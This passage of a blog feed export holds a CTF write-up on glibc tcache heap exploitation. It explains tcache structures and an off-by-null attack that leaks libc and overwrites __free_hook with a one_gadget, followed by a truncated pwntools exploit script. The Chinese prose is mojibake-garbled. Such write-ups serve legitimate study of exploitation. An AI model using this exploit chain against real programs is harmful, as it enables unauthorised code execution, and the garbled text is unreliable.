    ru<span class="token punctuation">(</span><span class="token string">" it!\n"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># gdb()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://s2.loli.net/2024/08/19/ZQMTLc4iVNIoryl.png" alt="744729e82978420d84eeca744fdc8c97.png"></p>
]]></content>
      <categories>
        <category>åšé¢˜ç¬”è®°</category>
        <category>ç§¯ç´¯</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache_attackçš„å­¦ä¹ </title>
    <url>/2024/07/13/tcache-attack%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>ä¹‹å‰æ‰¾ä¸“ä¸šå­¦é•¿ä¹°çš„ctfshowçš„pwné¢˜ç›®ï¼Œåœ¨å­¦æ ¡çš„æ—¶å€™æŠŠæ ˆæ–¹é¢æ‰“å®Œäº†ã€‚å› ä¸ºæœ¬äººæ˜¯ä¸ªæ‡’çŒªæ‰€ä»¥ä¸€æ‹–å†æ‹–ï¼Œä¹Ÿå°±ç•™åˆ°äº†ç°åœ¨ã€‚å‰é¢å‡ ä¸ªheapé¢˜ç›®æ¯”è¾ƒç®€å•ç­‰æˆ‘æœ‰æ—¶é—´åœ¨å†™ã€‚</p>
<h5 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h5><p>é¦–å…ˆæˆ‘ä»¬å¾—äº†è§£ä»€ä¹ˆæ˜¯Tcacheï¼ŸTcacheï¼ˆThread Cacheï¼‰æ˜¯glibcä»ï¼’.ï¼’ï¼–ç‰ˆæœ¬å¼€å§‹å¼•å…¥å¾—ä¸€ä¸ªç‰¹æ€§ï¼Œæ—¨åœ¨æå‡å†…å­˜åˆ†é…æ€§èƒ½ã€‚å­¦è¿‡æœºç»„å¾—éƒ½çŸ¥é“è¿™ä¸ªå°±æ˜¯å“ªä¸ªç¼“å­˜ï¼Œä¸€èˆ¬è®¡ç®—æœºåœ¨è¯»å–æ•°æ®çš„æ—¶å€™æœ‰å¥½å‡ å±‚ç¼“å­˜ã€‚ä½†è¿™ä¹ŸåŠ å¤§äº†å¯¹å †æ”»å‡»çš„éš¾åº¦ã€‚</p>
<p>åœ¨ tcache ä¸­æ–°å¢äº†ä¸¤ä¸ªç»“æ„ä½“ï¼Œåˆ†åˆ«æ˜¯ tcache_entry å’Œ tcache_perthread_struct</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span>
typedef <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> tcache_entry<span class="token punctuation">;</span>

<span class="token comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span>
typedef <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> tcache_perthread_struct<span class="token punctuation">;</span>

<span class="token keyword">static</span> __thread tcache_perthread_struct <span class="token operator">*</span>tcache <span class="token operator">=</span> NULL<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>å…¶ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„å‡½æ•°ï¼Œ <code>tcache_get()</code> å’Œ <code>tcache_put()</code>:</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span>
tcache_put <span class="token punctuation">(</span><span class="token class-name">mchunkptr</span> chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> chunk2mem <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  assert <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>
tcache_get <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  assert <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  assert <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°ä¼šåœ¨å‡½æ•° <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173">_int_free</a> å’Œ <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051">__libc_malloc</a> çš„å¼€å¤´è¢«è°ƒç”¨ï¼Œå…¶ä¸­ <code>tcache_put</code> å½“æ‰€è¯·æ±‚çš„åˆ†é…å¤§å°ä¸å¤§äº<code>0x408</code>å¹¶ä¸”å½“ç»™å®šå¤§å°çš„ tcache bin æœªæ»¡æ—¶è°ƒç”¨ã€‚ä¸€ä¸ª tcache bin ä¸­çš„æœ€å¤§å—æ•°<code>mp_.tcache_count</code>æ˜¯<code>7</code>ã€‚</p>
<p>ä»ä¸Šé¢å¯ä»¥å¾—åˆ°<code>tcacheæœ€å¤šå¯ä»¥å­˜æ”¾ï¼—ä¸ªchunkã€‚</code></p>
<h6 id="è¯´è¿™ä¹ˆå¤šä¸å¦‚ç›´æ¥çœ‹ä¾‹é¢˜ï¼ï¼ï¼"><a href="#è¯´è¿™ä¹ˆå¤šä¸å¦‚ç›´æ¥çœ‹ä¾‹é¢˜ï¼ï¼ï¼" class="headerlink" title="è¯´è¿™ä¹ˆå¤šä¸å¦‚ç›´æ¥çœ‹ä¾‹é¢˜ï¼ï¼ï¼"></a>è¯´è¿™ä¹ˆå¤šä¸å¦‚ç›´æ¥çœ‹ä¾‹é¢˜ï¼ï¼ï¼</h6><p><img src="https://s2.loli.net/2024/08/19/TkLAMtV3CehQvKs.png" alt="99397f6d2a864f9a993c5d28240239c1.png"></p>
<p>checksecä¹‹åå¯ä»¥çœ‹åˆ°ï¼Œä¿®æ”¹free_gotä¸ºsystemä¸è¡Œäº†ã€‚è€Œä¸”è¿˜å¼€å¯äº†æœ¬äººæœ€è®¨åŒçš„PIEï¼ˆæœ¬äººåœ¨æ ˆæ–¹é¢é¢å¯¹PIEæ¯”è¾ƒå¤´ç–¼ï¼Œä¹‹åç»è¿‡å­¦é•¿æŒ‡ç‚¹ç°åœ¨å¯èƒ½å¥½ç‚¹ã€‚åœ¨æ­¤è¿˜æ˜¯æ„Ÿè°¢æˆ‘çš„å­¦é•¿ï¼‰ï¼Œä»ä¿æŠ¤æœºåˆ¶æ¥çœ‹è‚¯å®šè¦æ³„éœ²libcåŸºåœ°å€ã€‚æ¥ä¸‹æ¥è¿›å…¥idaæ¥çœ‹çœ‹å®ƒçš„é€»è¾‘</p>
<p>mainå‡½æ•°ï¼Œå…ˆç”³è¯·ä¸€ä¸ª0xb0(è¿™ä¸ªå¤§å°æ˜¯åŒ…å«0x10çš„sizeå’Œpre_sizeçš„ï¼Œè¿™æ ·ä¸pwndbgå¯¹çš„ä¸Šï¼Œæ–¹ä¾¿è§‚å¯Ÿï¼Œæœ›è¯»è€…è§è°…ï¼‰chunkï¼Œç”¨æ¥å­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆï¼ˆæŒ‡å‘ä½ æ‰€ç”³è¯·çš„chunkçš„å†…å®¹ï¼‰è¿˜æœ‰ä¸€ä¸ªç”¨æ¥å­˜æ”¾ä½ æ‰€ç”³è¯·çš„å¤§å°ï¼Œç»å…¸èœå•é¢˜ï¼Œæ²¡æœ‰ç»™åé—¨å‡½æ•°ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/MCOy6wsHx7dNA9G.png" alt="98064aa85e484d2598aef202a630217e.png"></p>
<p>addå‡½æ•°ï¼ˆè‡ªå·±å‘½åï¼Œå¯¹ç€å‡½æ•°åæŒ‰Nå°±å¯ä»¥ä¿®æ”¹ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°å›ºå®šç”³è¯·å¾—å†…å­˜å¤§å°ä¸º0xf8ï¼Œä½†æ˜¯è®©ä½ è¾“å…¥sizeä¸èƒ½å¤§äº0xf8ï¼Œå…¶å®è¿™ä¸ªå½±å“ä¸å¤§ï¼ˆåŸºæœ¬ä¸Šctfå®ƒè§„å®šä½ å¤šå¤§åŸºæœ¬ä¸Šä½ ä¹Ÿå°±ç”³è¯·é‚£ä¹ˆå¤§è¶³å¤Ÿäº†ï¼‰é€»è¾‘å¾ˆç®€å•ï¼Œä½†æ˜¯å‘¢ï¼ï¼ï¼çœ‹åˆ°å“ªä¸ªåå­—å¾ˆå¤šaaaaaaçš„å‡½æ•°äº†å—ï¼Ÿå“ªä¸ªæ˜¯å…³é”®çš„å‡½æ•°ï¼ˆæˆ‘ä¹Ÿç»™å®ƒä¿®æ”¹äº†åå­—ä¸ºäº†è®©æˆ‘è‡ªå·±æ–¹ä¾¿çœ‹ï¼‰</p>
<p><img src="https://s2.loli.net/2024/08/19/OlDnVpF38MhZxty.png" alt="f28b37eb2d0347a88f0b4e4d1b2f216a.png"></p>
<p>è¿›å…¥aaaaaaaaå‡½æ•°ï¼Œå€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‰é¢mainå‡½æ•°æåˆ°çš„æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯mainå‡½æ•°æåˆ°çš„sizeã€‚if(a2)æ„Ÿè§‰å¾ˆå¥‡æ€ªå˜›ï¼Œä»”ç»†çœ‹ä¼šå‘ç°result &#x3D; &amp;a1[a2]è¿™ä¸ªåœ°æ–¹ä¼šæº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªï¼Œåé¢<em>result &#x3D; 0æ­£å¥½å¯ä»¥æƒ³åˆ°off-by-nnullã€‚æ³¨æ„å…¶å®å°±æœ¬äººè€Œè¨€æ²¡å¿…è¦è®°å½•ä»€ä¹ˆintï¼Œlongç±»å‹ï¼Œå…¶å®ä»–ä»¬çš„åŒºåˆ«éƒ½æ˜¯å­˜å‚¨ç±»å‹çš„å¤§å°ä¸åŒï¼Œæœ¬è´¨å¯¹äºè®¡ç®—æœºå°±æ˜¯å­˜å‚¨çš„å¤§å°ä¸ä¸€æ ·ï¼Œå…¶å®ä½ åªè¦ä¼šè®¿é—®å†…å­˜ï¼Œå°±å¯ä»¥ç”¨æœ‰é™ä¸ªchar</em>æ¥è¡¨ç¤ºä½ æ‰€éœ€è¦çš„ä»»æ„é•¿çš„ç±»å‹ï¼Œå½“æ—¶å¦‚æœä½ æ˜¯ä¸ªä¸“ä¸šçš„ç¨‹åºå¼€å‘äººå‘˜ï¼Œå½“èœé¸¡æˆ‘åœ¨æ”¾å±ï¼Œå­˜åœ¨æœºå™¨å­—é•¿å¯¹é½çš„é—®é¢˜ï¼Œå®ƒä¼šå½±å“æ€§èƒ½ï¼Œä¸‹æ¬¡æœ‰æœºä¼šä¹Ÿå¯ä»¥åˆ†æä¸€ä¸‹ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/Pg9NFf1HL6VInuz.png" alt="98790afd591b467d8fd6c2c3ef734656.png"></p>
<p>deleteå‡½æ•°ï¼Œå®ƒå¾ˆå¹²è„†æ²¡æœ‰ç»™æˆ‘ä»¬ç•™ä¸‹ä»€ä¹ˆæœ‰ç”¨çš„</p>
<p><img src="https://s2.loli.net/2024/08/19/vGEBaoj5V1fSgds.png" alt="48fb782263bc4eadad03156ed8809fd4.png"></p>
<p>showå‡½æ•°</p>
<p><img src="https://s2.loli.net/2024/08/19/QctTw36L4aVlzrA.png" alt="7cfe26f519a849e1833f7f67c46669f0.png"></p>
<p>çœ‹å®Œå…¨éƒ¨çš„é€»è¾‘ï¼Œæˆ‘ä»¬å¤§è‡´ä¹Ÿäº†è§£äº†ã€‚å› ä¸ºå¼€å¯äº†Full RELROä¸èƒ½ä¿®æ”¹gotè¡¨ï¼Œå¼€å¯PIEæƒ³ç€èƒ½ä¸èƒ½æ³„éœ²libcåŸºåœ°å€ã€‚è¿™é‡Œæ²¡æœ‰gotè¡¨äº†ï¼Œæ‰€ä»¥æƒ³åˆ°hookå‡½æ•°å’ŒIOæµå› ä¸ºæœ¬äººå¯¹IOä¸æ˜¯ç‰¹åˆ«ç†Ÿæ‚‰æ‰€ä»¥ä¸æ¸…æ¥šå¯ä»¥ä¸å¯ä»¥ï¼Œæ‰€ä»¥å°±æ˜¯ç”¨çš„hookå‡½æ•°ï¼Œé€šè¿‡æ³„éœ²main_arenaã€‚å¤§è‡´æ€è·¯å°±æ˜¯å…ˆç”³è¯·10ä¸ªchunkï¼Œå°†tcacheç»™å¡«æ»¡ï¼ˆchunk0-5ï¼Œ9ï¼‰ï¼Œå‰©ä¸‹çš„æ”¾åˆ°äº†unsortbinsé‡Œé¢ï¼ˆchunk6ï¼Œ8ï¼‰ï¼Œåœ¨é‡æ–°ç”³è¯·è¿™10ä¸ªchunkï¼Œè¿™æ ·å®ƒä»¬çš„pre_sizeä½å…¨éƒ¨éƒ½å¡«å†™å®Œæˆï¼Œè¯¥å¦‚ä½•æ³„éœ²fdå‘¢ï¼Ÿè¿™å°±éœ€è¦åˆ©ç”¨åˆ°å‰é¢çš„off-by-oneé€šè¿‡chunk7å°†chunk8çš„sizeä½çš„æœ€ä½inuseä½å˜æˆ0ï¼Œè¿™æ ·è®©chunk8è¯¯ä»¥ä¸ºå‰é¢çš„chunkéƒ½æ˜¯freeçš„çŠ¶æ€ï¼Œé”™æŠŠå‰é¢çš„chunk6ï¼Œchunk7è¿›è¡Œåˆå¹¶å½¢æˆä¸€ä¸ªæ›´å¤§çš„chunkï¼ˆsize &#x3D; 0x300ï¼‰</p>
<h5 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h5><p>åˆšå¼€å§‹</p>
<p><img src="https://s2.loli.net/2024/08/19/SoZ4zF3nrcpu79w.png" alt="e754e51f76f84d80be03f9c256adf318.png"></p>
<p>ä¸€æ¬¡ä¸€æ¬¡freeåï¼Œå› ä¸ºç‰©ç†å†…å­˜æ˜¯è¿ç»­çš„æ‰€ä»¥ä¼šåˆå¹¶æˆä¸€ä¸ªå¤§çš„å†…å­˜å—0x300(è¯»è€…å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œä¸‰ä¸ªå†…å­˜å—è¿ç»­å­˜å‚¨åœ¨ä¸€èµ·ï¼Œæœ¬äººå¤ªèµ–äº†ä¸æƒ³ç§»åŠ¨ï¼Œæœ›è¯»è€…è§è°…ï¼‰</p>
<p><img src="https://s2.loli.net/2024/08/19/jIhkQP1rsSAOzgy.png" alt="f133ae510ecc4877b3ef4ed25255d52a.png"></p>
<p>åœ¨é‡æ–°ç”³è¯·å›æ¥è¿™ä¸‰ä¸ªchunk</p>
<p><img src="https://s2.loli.net/2024/08/19/ZhteDBdQ8sH24Lk.png" alt="c1737e4489714977967a3c89dd95f00b.png"></p>
<p>æ­¤æ—¶å¦‚æœfreeæ‰chunk_6ï¼Œchunk_7,chunk_6çš„fdå°±å­˜æ”¾åœ¨main_arenaçš„åœ°å€</p>
<p><img src="https://s2.loli.net/2024/08/19/M6teBn3VFmlRoQk.png" alt="Awn3RCVNKWz8MtU.png"></p>
<p>åœ¨ç”³è¯·å›æ¥chunk_7,å› ä¸ºoff-by-one,ä½¿å¾—0x101çš„inuseä½å˜æˆäº†0ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/rcXoI1Z4HfaxKY2.png" alt="J1q39uDa2mgWY5z.png"></p>
<p>è¿™æ—¶å€™åœ¨freeæ‰chunk_8ï¼Œå°±ä¼šå¯¼è‡´chunk_8ä»¥ä¸ºå‰é¢éƒ½æ˜¯ç©ºé—²çš„chunkï¼Œä¸€èµ·åˆå¹¶äº†ã€‚è¿™æ—¶å€™åœ¨ç”³è¯·å‡ºæ¥chunk_6ï¼Œmain_arenaå°±ä¼šæ”¹å†™chunk_7çš„fdæŒ‡é’ˆï¼Œä½†æ˜¯å‘¢chunk_7æ˜¯æˆ‘ä»¬å·²ç»ç”³è¯·çš„å†…å­˜ï¼Œåœ¨showä¸€ä¸‹å°±å¯ä»¥æ³„éœ²å‡ºæ¥libcäº†ã€‚</p>
<h5 id="expçš„æµç¨‹å›¾"><a href="#expçš„æµç¨‹å›¾" class="headerlink" title="expçš„æµç¨‹å›¾"></a>expçš„æµç¨‹å›¾</h5><p>è¿™äº›ä¸œè¥¿è¯´èµ·æ¥å®¹æ˜“ï¼Œæƒ³èµ·æ¥è¿˜æ˜¯å¾ˆè´¹æ—¶é—´çš„ã€‚æ‰€ä»¥æ¯”èµ·æ–‡å­—æˆ‘æƒ³è¿˜æ˜¯ç”¨å›¾ç‰‡æ¥ä»£æ›¿æ¯”è¾ƒå¥½äºç†è§£ã€‚</p>
<p>ç”³è¯·10ä¸ªchunk</p>
<p><img src="https://s2.loli.net/2024/08/19/yLbip4TY9qaM8GQ.png" alt="bcbd6c720f12439091a06d52a68f4258.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/6ByQicluYatMIdS.png" alt="6d9ff0b2207442a1a23695416fbfad68.png"></p>
<p> åœ¨åˆ†åˆ«freeæ‰chunk0-5,chunk9(åˆ†å¼€freeæ˜¯ä¸ºäº†é˜²æ­¢äºtop chunkåˆå¹¶ï¼‰ï¼Œfreeæ‰chunk6ï¼Œ7ï¼Œ8</p>
<p><img src="https://s2.loli.net/2024/08/19/AwZKkfcz86O5uXS.png" alt="d890caac82d44d7287637296a7a8f566.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/oST74nXQ5ihv8YE.png" alt="b319ebbeb2ab470f8004e604f6bf43fd.png"></p>
<p>å†å°†å…¶å…¨éƒ¨ç”³è¯·æ‰,ï¼ˆä¸ºäº†ä¿®æ”¹chunk_8çš„pre_sizeä½ä¸º0x200)</p>
<p><img src="https://s2.loli.net/2024/08/19/sq1ZuCPyFK9m4gf.png" alt="325df0c36a82471d96734fb3d8c5da03.png"></p>
<p>å†freeæ‰0-5ä½çš„chunk,freeæ‰8å·ä½ç½®çš„ï¼Œfree(7)æ­¤æ—¶chunk_6çš„fdæŒ‡é’ˆæŒ‡å‘main_arena + 0x60</p>
<p><img src="https://s2.loli.net/2024/08/19/ty2KUh7PmvELVai.png" alt="mSAV6HlzhLeCgXv.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/19LJX32KbzHFkaE.png" alt="09dea70c15d344f69264b4f55eb318b5.png"></p>
<p>å†ç”³è¯·å°†chunk_7ç”³è¯·å›æ¥ï¼Œå†é¡ºåºfreeæ‰chunk_0å’Œchunk_8,è¿™æ—¶å€™chunk_8å‘å‰åˆå¹¶å¤§chunkå…¶size&#x3D;0x300</p>
<p><img src="https://s2.loli.net/2024/08/19/nbJEB2dhcO9mjoi.png" alt="68cc969198ee44c3a372adb6e1e08a29.png"></p>
<p>å†ç”³è¯·8ä¸ªchunkä½¿å¾—unsortbinsä¿®æ”¹chunk_7çš„fdæŒ‡é’ˆä¸ºmain_arena + 0x60ï¼Œè¿™æ—¶å€™showï¼ˆ0ï¼‰å°±å¯ä»¥æ³„éœ²å‡ºæ¥main_arena + 0x60çš„å€¼ï¼Œå†é€šè¿‡å…¶æ¥è®¡ç®—å¾—åˆ°__malloc_hookï¼Œè¿›è€Œç®—å‡ºæ¥libcåŸºåœ°å€ã€‚åé¢å°±æ˜¯æœ›__free_hooké‡Œé¢å†™one_gadgetã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/VSCsQmLZgEJi6Pr.png" alt="7913c91707994d3bbc75671e2642bd35.png"></p>
<p>å†ç”³è¯·ä¸€ä¸ªchunkå¾—åˆ°,å¯ä»¥çœ‹åˆ°chunk_7æœ‰ä¸¤ä¸ª</p>
<p><img src="https://s2.loli.net/2024/08/19/4wd7lhDCgNesWvU.png" alt="500360f1a1184d6d9f5135e1a6f091cc.png"></p>
<p>å†freeæ‰chunk_1,chunk_2æ¥é˜²æ­¢æŠ¥é”™ï¼Œå†freeï¼ˆ9ï¼‰ï¼ˆ0ï¼‰ï¼Œä½¿å…¶ç±»ä¼¼äºdouble fastbinsé‚£ç§æ”»å‡»ï¼Œ</p>
<p><img src="https://s2.loli.net/2024/08/19/ykaZ8pv7sejfc3N.png" alt="f5c879166d6f4883bc5568589a253c19.png"></p>
<p>å†é€šè¿‡ç”³è¯·ä¸¤æ¬¡chunkåˆ†åˆ«éƒ½æ˜¯chunk_7çš„å†…å®¹ï¼Œè¾¾åˆ°ä¿®æ”¹free_hookçš„å†…å®¹ä¸ºone_gadgetè¾¾åˆ°getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/Mum5ZyweHQdgUt7.png" alt="2a9b715b6fc2476589257fcb25793d69.png"></p>
<h5 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h5><p>æœ€åå‘¢ï¼Œå°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œå¯¹äºheapé¢˜ç›®è¦æ³¨æ„å¯¹é½ç”³è¯·ä¸ä¸å¯¹é½ç”³è¯·çš„ä¸åŒã€‚å¦‚æœä½ æƒ³ç”¨åˆ°ä¸‹ä¸€ä¸ªchunkçš„pre_sizeåŒºåŸŸå°±ä¸å¯¹å…¶ç”³è¯·ï¼Œå¦‚expé‡Œé¢çš„0xf8ã€‚</p>
<h5 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h5><p>æ„Ÿè°¢é˜…è¯»ï¼Œæœ¬äººä¹Ÿæ˜¯å°ç™½å¯ä»¥ç•™è¨€ã€‚æœ‰æœºä¼šå¤šå¤šäº¤æµï¼Œè°¢è°¢ã€‚</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    
    
    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content \n> "</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>length<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size of Heap :'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content of heap :'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
